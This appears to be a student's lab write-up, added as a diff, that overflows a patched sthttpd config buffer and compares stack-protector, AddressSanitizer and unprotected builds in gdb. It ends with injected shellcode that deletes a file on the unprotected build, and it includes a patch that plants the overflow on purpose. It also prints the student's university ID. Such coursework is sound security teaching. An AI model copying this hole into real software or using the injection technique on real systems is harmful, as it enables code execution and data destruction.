@@ -1,0 +1,483 @@
+1. First, we check if we're using the right gcc compiler:
+
+
+$ which gcc
+
+usr/bin/gcc
+
+To fix this, we create a file .bash_profile, and enter the path of the gcc version we want to use:
+
+$ vi .bash_profile
+
+
+======================================================
+~ export PATH="/usr/local/cs/bin:$PATH"
+~
+~
+~
+======================================================
+
+exit out of the file, and apply the changes:
+
+$ sourch .bash_profile
+
+
+To versify if the change has taken place:
+
+$ which gcc
+
+/usr/local/cs/bin/gcc
+
+
+$ gcc --version
+
+gcc (GCC) 6.2.0
+Copyright (C) 2016 Free Software Foundation, Inc.
+This is free software; see the source for copying conditions.  There is NO
+warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+
+
+Now we can apply the patch
+
+2. Create a text file called sthttpdpaatch.txt, copy the diff into it, and then apply the patch:
+
+$ vi sthttpdpatch.txt
+
+=====================================================================================
+--- sthttpd-2.27.0/src/thttpd.c	2014-10-02 15:02:36.000000000 -0700
++++ sthttpd-2.27.0-delta/src/thttpd.c	2015-04-30 19:15:24.820042000 -0700
+@@ -999,7 +999,7 @@ static void
+ read_config( char* filename )
+     {
+     FILE* fp;
+-    char line[10000];
++    char line[100];
+     char* cp;
+     char* cp2;
+     char* name;
+@@ -1012,7 +1012,7 @@ read_config( char* filename )
+ 	exit( 1 );
+ 	}
+
+-    while ( fgets( line, sizeof(line), fp ) != (char*) 0 )
++    while ( fgets( line, 1000, fp ) != (char*) 0 )
+ 	{
+ 	/* Trim comments. */
+ 	if ( ( cp = strchr( line, '#' ) ) != (char*) 0 )
+ =======================================================================================
+
+$ cd sthttpd/src
+$ patch -p0 <sthttpdpatch.txt
+File to patch: thttpd.c
+
+
+3. Then we build using the given shell command:
+
+$./configure \
+> LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"
+
+Once it's done 'making', we compile it using three different compilation methods:
+
+"-g3 -O2 -fno-inline -fstack-protector-strong":
+
+$ make clean
+$ make CFLAGS='-m32 -g3 -O2 -fno-inline -fstack-protector-strong'
+$ mv src/thttpd src/thttpd-sp
+
+"-g3 -O2 -fno-inline -fsanitize=address":
+
+$ make clean
+$ make CFLAGS='-m32 -g3 -O2 -fno-inline -fsanitize=address'
+$ mv src/thttpd src/thttpd-as
+
+"-g3 -O2 -fno-inline -fno-stack-protector -zexecstack":
+
+$ make clean
+$ make CFLAGS='-m32 -g3 -O2 -fno-inline -fno-stack-protector -zexecstack'
+$ mv src/thttpd src/thttpd-no
+
+
+4. Now, to determine which port to run the modified sthttpd daemons under, we use the given formula:
+
+(12330 + 3 * (X % 293) + Y)
+
+where X is my university ID, and Y is , 2, or 3 depending on which variant we are testing (1=SP, 2=AS, 3=NO)
+
+My UID: 404629702
+
+==> 12330 +3*(404629702 % 293) + Y = 12984 + Y
+
+Then we run:
+
+$ cd src
+
+a)  SP  Y=1
+
+Port number = 12985
+
+$ ./thttpd-sp -p 12985 -D
+
+To verify if the servers work in the normal case, we use the curl shell command to retrieve a file foo.txt that we'll create in a new terminal and save in the sthttpd directory 
+
+$ curl http://localhost:12985/foo.txt
+
+===========================================
+Test Worked!!
+~
+~
+===========================================
+
+Then we run the AS and NO versions, and test if each version works using the curl command:
+
+b)  AS  Y=2
+Port number = 12986
+
+$ ./thttpd-as -p 12986 -D
+
+$ curl http://localhost:12986/foo.txt
+
+
+c) NO  Y=3
+Port number = 12987
+
+$ ./thttpd-no -p 12987 -D
+
+$ curl http://localhost:12987/foo.txt
+
+
+All tests print out foo.txt without errors
+
+
+
+4. Now we smash!
+
+When we examine the patch, we can see that is amends the line that initializes the character array to accept 100 characters, instead of 10,000. 
+
+Hence, for a proper input to smash all three variants, I wrote smash.txt to be a text file starting with "port=" followed by a character string of random characters longer than 100 characters. For the sake of simplicity, my smash.txt file is "port=0123456789..." where the string repeats itself 25 or so times.
+
+
+a) When we run the SP variation using the folloiwing command, it detects a smashing attempt and subsequently terminates thttpd-sp:
+
+[ingle@lnxsrv07 ~/Smashing/sthttpd-2.27.0/src]$ ./thttpd-sp -p 12985 -D -C smash.txt
+*** stack smashing detected ***: ./thttpd-sp terminated
+Segmentation fault
+
+To figure out which assembly command causes it to crash, we open thttpd-sp in gdb:
+
+
+$ gdb thttpd-sp
+(gdb) run -p 12985 -D -C smash.txt
+
+and I get this output:
+
+
+==================================================================================
+
+Starting program: /w/home.11/ma/ugrad/ingle/Smashing/sthttpd-2.27.0/src/thttpd-s                                                                             p -p 12985 -D -C smash.txt
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib64/libthread_db.so.1".
+*** stack smashing detected ***: /w/home.11/ma/ugrad/ingle/Smashing/sthttpd-2.27                                                                             .0/src/thttpd-sp terminated
+
+Program received signal SIGSEGV, Segmentation fault.
+uw_frame_state_for (context=context@entry=0xffffb970, fs=fs@entry=0xffffb9f0)
+    at ../../../../gcc-6.2.0/libgcc/unwind-dw2.c:1249
+1249    ../../../../gcc-6.2.0/libgcc/unwind-dw2.c: No such file or directory.
+
+==================================================================================
+
+Then we get a backtrace to figure out which assembly code causes the error:
+
+(gdb) bt
+
+===================================================================================================================================================================
+#0  uw_frame_state_for (context=context@entry=0xffffb970, fs=fs@entry=0xffffb9f0) at ../../../../gcc-6.2.0/libgcc/unwind-dw2.c:1249
+#1  0xf7fd13f8 in _Unwind_Backtrace (trace=0xf7eccc80 <backtrace_helper>, trace_argument=0xffffbaec) at ../../../../gcc-6.2.0/libgcc/unwind.inc:290
+#2  0xf7eccd75 in backtrace () from /lib/libc.so.6
+#3  0xf7e2ea71 in __libc_message () from /lib/libc.so.6
+#4  0xf7ed02d5 in __fortify_fail () from /lib/libc.so.6
+#5  0xf7ed028a in __stack_chk_fail () from /lib/libc.so.6
+#6  0x0804c36e in read_config (filename=<optimized out>) at thttpd.c:1190
+#7  0x30393837 in ?? ()
+#8  0x34333231 in ?? ()
+#9  0x38373635 in ?? ()
+#10 0x32313039 in ?? ()
+#11 0x36353433 in ?? ()
+#12 0x30393837 in ?? ()
+#13 0x34333231 in ?? ()
+#14 0x38373635 in ?? ()
+#15 0x32313039 in ?? ()
+#16 0x36353433 in ?? ()
+#17 0x30393837 in ?? ()
+#18 0x34333231 in ?? ()
+#19 0x38373635 in ?? ()
+#20 0x32313039 in ?? ()
+#21 0x36353433 in ?? ()
+#22 0x30393837 in ?? ()
+#23 0x34333231 in ?? ()
+#24 0x38373635 in ?? ()
+#25 0x32313039 in ?? ()
+#26 0x36353433 in ?? ()
+#27 0x30393837 in ?? ()
+#28 0x34333231 in ?? ()
+#29 0x38373635 in ?? ()
+#30 0x32313039 in ?? ()
+#31 0x36353433 in ?? ()
+#32 0x30393837 in ?? ()
+#33 0x34333231 in ?? ()
+#34 0x38373635 in ?? ()
+#35 0x32313039 in ?? ()
+#36 0x36353433 in ?? ()
+#37 0x30393837 in ?? ()
+#38 0x34333231 in ?? ()
+#39 0x38373635 in ?? ()
+#40 0x32313039 in ?? ()
+#41 0x36353433 in ?? ()
+#42 0x30393837 in ?? ()
+#43 0x34333231 in ?? ()
+
+=================================================================================================================================================================
+(gdb) q
+
+From this, we can say that the problem begins after line #6 as the addresses for assembly codes after line 6 are missing (hence the '??'). To examine the assembley, we set a breakpoint at line before line 1190 and proceed from there.
+
+$ gdb thttpd-as 
+
+(gdb) break 1190
+(gdb) set disassemble-next-line on
+(gdb) run -p 12985 -D -C smash.txt
+(gdb) si
+(gdb) si
+(gdb) si
+
+==================================================================================================
+1190        
+   0x0804c292 <read_config+1314>:       83 c4 10        add    $0x10,%esp
+   0x0804c295 <read_config+1317>:       8b 44 24 7c     mov    0x7c(%esp),%eax
+   0x0804c299 <read_config+1321>:       65 33 05 14 00 00 00    xor    %gs:0x14,%eax                   
+ =>0x0804c2a0 <read_config+1328>:       0f 85 c3 00 00 00       jne    0x804c369 <read_config+1529> //    (!!)
+   0x0804c2a6 <read_config+1334>:       81 c4 8c 00 00 00       add    $0x8c,%esp
+   0x0804c2ac <read_config+1340>:       5b      pop    %ebx
+   0x0804c2ad <read_config+1341>:       5e      pop    %esi
+   0x0804c2ae <read_config+1342>:       5f      pop    %edi
+   0x0804c2af <read_config+1343>:       5d      pop    %ebp
+   0x0804c2b0 <read_config+1344>:       c3      ret
+==================================================================================================
+
+(gdb) si
+
+==================================================================================================
+1190        }
+=> 0x0804c369 <read_config+1529>:       e8 e2 d4 ff ff  call   0x8049850 <__stack_chk_fail@plt>    //      (!!)
+(gdb)
+0x08049850 in __stack_chk_fail@plt ()
+==================================================================================================
+
+As we can see from the two lines marked with (!!), the xor command checks if the canary is modified. If it is, the program jumps to <read_config+1529>, which is some kind of error handling step. 	 
+
+
+b) Now, we run the AS variation in gdb
+
+
+$ gdb thttpd-as
+
+(gdb) set disassemble-next-line on
+(gdb) run -p 12986 -D -C smash.txt
+
+=================================================================================================================================================================Starting program: /w/home.11/ma/ugrad/ingle/Smashing/sthttpd-2.27.0/src/thttpd-a                                                                             s -p 12986 -D -C smash.txt
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib64/libthread_db.so.1".
+warning: File "/usr/local/cs/gcc-6.2.0/lib/libstdc++.so.6.0.22-gdb.py" auto-load                                                                             ing has been declined by your `auto-load safe-path' set to "$debugdir:$datadir/a                                                                             uto-load".
+To enable execution of this file add
+        add-auto-load-safe-path /usr/local/cs/gcc-6.2.0/lib/libstdc++.so.6.0.22-                                                                             gdb.py
+line to your configuration file "/u/ma/ugrad/ingle/.gdbinit".
+To completely disable this security protection add
+        set auto-load safe-path /
+line to your configuration file "/u/ma/ugrad/ingle/.gdbinit".
+For more information about this security protection see the
+"Auto-loading safe path" section in the GDB manual.  E.g., run from the shell:
+        info "(gdb)Auto-loading safe path"
+=================================================================
+==8275==ERROR: AddressSanitizer: stack-buffer-overflow on address 0xffffc094 at                                                                              pc 0xf7a955be bp 0xffffbfe8 sp 0xffffbbc0
+READ of size 347 at 0xffffc094 thread T0
+    #0 0xf7a955bd in __interceptor_strchr ../../../../../gcc-6.2.0/libsanitizer/                                                                             asan/asan_interceptors.cc:468
+    #1 0x804eb76 in read_config /u/ma/ugrad/ingle/Smashing/sthttpd-2.27.0/src/th                                                                             ttpd.c:1018
+    #2 0x36353432  (<unknown module>)
+
+Address 0xffffc094 is located in stack of thread T0 at offset 132 in frame
+    #0 0x804eacf in read_config /u/ma/ugrad/ingle/Smashing/sthttpd-2.27.0/src/th                                                                             ttpd.c:1000
+
+  This frame has 1 object(s):
+    [32, 132) 'line' <== Memory access at offset 132 overflows this variable
+HINT: this may be a false positive if your program uses some custom stack unwind                                                                              mechanism or swapcontext
+      (longjmp and C++ exceptions *are* supported)
+SUMMARY: AddressSanitizer: stack-buffer-overflow ../../../../../gcc-6.2.0/libsan                                                                             itizer/asan/asan_interceptors.cc:468 in __interceptor_strchr 
+//(!!)                            
+Shadow bytes around the buggy address:
+  0x3ffff7c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x3ffff7d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x3ffff7e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x3ffff7f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x3ffff800: 00 00 f1 f1 f1 f1 00 00 00 00 00 00 00 00 00 00
+=>0x3ffff810: 00 00[04]f4 f4 f4 f3 f3 f3 f3 00 00 00 00 00 00
+  0x3ffff820: 00 00 00 00 00 00 00 00 00 00 f1 f1 f1 f1 04 f4
+  0x3ffff830: f4 f4 f2 f2 f2 f2 04 f4 f4 f4 f2 f2 f2 f2 00 f4
+  0x3ffff840: f4 f4 f2 f2 f2 f2 00 00 00 00 00 00 00 00 00 00
+  0x3ffff850: 00 00 00 00 00 00 f2 f2 f2 f2 00 00 00 00 00 00
+  0x3ffff860: 00 00 00 00 00 00 00 00 00 00 f2 f2 f2 f2 00 00
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07
+  Heap left redzone:       fa
+  Heap right redzone:      fb
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack partial redzone:   f4
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==8275==ABORTING
+[Inferior 1 (process 8275) exited with code 01]
+=================================================================================================================================================================
+
+Attempts to backtrace fail, and the output message says:
+
+(gdb) bt
+No stack
+
+
+
+The highlighted line shines some light on the problem here. The cmp function followed by the call to the reporting aborts the program.
+
+This is the call:
+AddressSanitizer: stack-buffer-overflow ../../../../../gcc-6.2.0/libsanitizer/asan/asan_interceptors.cc:468 in __interceptor_strchr 
+
+The error handling called that function because it detected that a certain byte in the 'shadow memory' became buggy, which triggered the abort.
+In the abort report, we can see the bytes that were corrupted. 
+
+
+
+c) Finally, we smash thttpd-no
+
+
+$ gdb thttpd-no 
+
+(gdb) run -p 12987 -D -C smash.txt
+
+=================================================================================================================================================================
+Starting program: /w/home.11/ma/ugrad/ingle/Smashing/sthttpd-2.27.0/src/thttpd-no -p 12987 -D -C smash.txt
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib64/libthread_db.so.1".
+
+Program received signal SIGSEGV, Segmentation fault.
+0x70397471 in ?? ()
+=================================================================================================================================================================
+
+The backtrace in this case also fails when it reaches memory location: 0x79343029
+
+(gdb) bt
+#0  0x70397471 in ?? ()
+#1  0x79743462 in ?? ()
+#2  0x76713970 in ?? ()
+#3  0x74797762 in ?? ()
+#4  0x62713970 in ?? ()
+#5  0x65797776 in ?? ()
+#6  0x71397074 in ?? ()
+#7  0x70777962 in ?? ()
+#8  0x79716274 in ?? ()
+#9  0x39743470 in ?? ()
+#10 0x34797175 in ?? ()
+#11 0x00007062 in ?? ()
+Backtrace stopped: Cannot access memory at address 0x79343029
+
+
+The backtrace abruptly ends because it tries to return to memory location 0x79343029, the program isn't there (the overflown buffer lives in that memory location), and as a result it crashes, with no checking or error reporting.
+
+
+5) Now, we create the assembly files for the three variants
+
+SP:
+
+$ make clean
+$ make CFLAGS='-m32 -S -O2 -fno-inline -fstack-protector-strong'
+$ mv src/thttpd.o src/thttpd-sp.s
+
+
+AS:
+$ make clean
+$ make CFLAGS='-m32 -S -O2 -fno-inline -fsanitize=address'
+$ mv src/thttpd.o src/thttpd-as.s
+
+
+NO:
+$ make clean
+$ make CFLAGS='-m32 -S -O2 -fno-inline'
+$ mv src/thttpd.o src/thttpd-no.s
+
+
+Now that we have the assembly codes in the three .s files, we can compare the assembly code of the function handle_read functions in them:
+
+For the funtion handle_read, there is no functional difference between the assembly code for handle_read when compiled using fstack-protector-strong and -fno-inline (NOTE: There are differences in the labels called through jump commands. These labels are different because earlier in the assembly code, there are differences which lead to the jump labels being numbered differently). This in because the the no variant has no provision for checking buffer overflows, hence the assembly only converts the c code directly, and in the sp variant, the overflow protection creates a canary surrounding the buffer on wither side only when the function declares any kind of local memory block (which can be in the form of an array, struct or union). Since in the function handle_read, there is no such declaration, the compiler doesn't create a canary for it.
+
+
+The -as variant is a lot longer and more complicated because what AS does is create an area of shadow memory around the buffer and maps that shadowed memory to bad memory. Therefore it has to check that the bytes its loading into the buffer is the shadow memory or not. Therefore we see that in AS handle_read there is a constant check for whether the address is shadowed or not. If the memory is shadowed then it poisons the value and throws a segmentation fault. This constant checking, anc calling of the reporting function __asan_report_load drastically increases the size of the assembly code. 
+
+
+
+
+6) Exploiting the bug in the NO variant
+
+
+While testing the no variant to figure out where in the assembly code does the vulnerability lie, we update it with a patch that limits the buffer to 100 characters, and the fgets function in the while loop looks at 1000 bytes of memory from the provided file in eah loop. Hence, fgets overreaches into the memory in the first loop iteration itself. To exploit that bug, we make, and compile the no variant again, and rename it to thttpd-smash so the original thttpd-no is not harmed in any way. We open and run this file in gdb start with a breakpoint at read_config:
+
+$ make clean
+$ make CFLAGS='-m32 -g3 -O2 -fno-inline -z execstack'
+$ mv thttpd thttpd-smash
+
+$ gdb thttpd-smash
+(gdb) break read_config
+(gdb) run -p 12987 -D -C smash.txt
+
+Then I keeping stepping until I reach the first line in the while loop that invokes fgets() (line 1015 in thttpd.c). Once there, we run the command to find the address of the beginning of the buffer:
+
+(gdb) p &line
+
+$1 = (char (*)[100]) 0xffffc18c
+
+
+
+I placed the string for the file that I want to delete "target.txt\0" at an address of 0xffffc250 (well beyond the 100 char limit of line)
+
+Next, I observed how C code would delete something in assembly.
+To do this, I inserted a 
+
+~ remove("target.txt")  
+
+c line of code into already existing code and observed the corresponding assembly language. Alternatively, I could use the 'unlink' command to delete a file using c. I'll also have to include "unistd.h" in the header to use unlink.
+
+I saw that the only two instructions that I needed to do was to push the address of the char array "target.txt\0" which was 0xffffc250 onto  the stack and then simply call the remove function. 
+
+To do this, I used a similar process in finding the address of line
+(gdb) print remove
+
+$2 = {<text variable, no debug info>} 0xf7e22a00 <remove>
+
+I found the address of remove to be 0xf7e22a00
+
+Now we have the necessary assembly instructions to delete the file:
+
+push 0xffffc250
+call 0xf7e22a00
+
+I translated this into object code, pust it into my smash.txt file and target.txt was successfully deleted.
+
+
